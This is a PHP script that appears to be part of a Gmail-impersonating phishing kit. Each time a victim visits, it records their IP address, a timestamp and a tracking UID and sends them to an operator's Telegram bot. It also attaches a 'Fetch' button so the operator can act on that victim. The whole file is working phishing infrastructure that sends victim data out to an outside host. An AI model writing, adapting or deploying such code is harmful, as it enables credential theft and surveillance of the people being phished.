<?php
include('../data.php');

$uid  = trim($_POST['uid'] ?? '');
$ip   = '';
foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
    if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
}
$date = date('d/m/Y H:i:s');

$msg  = "📧 GMAIL — NUEVA VISITA\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "🌐 IP: $ip\n";
$msg .= "🕒 Fecha: $date\n";
$msg .= "🔑 UID: $uid\n";

$keyboard = json_encode([
    'inline_keyboard' => [
        [
            ['text' => '🔗 Fetch', 'callback_data' => "FETCH|$uid"],
        ]
    ]
]);

file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
    'chat_id'      => $chat_id,
    'text'         => $msg,
    'reply_markup' => $keyboard,
]));

echo json_encode(['ok' => true]);
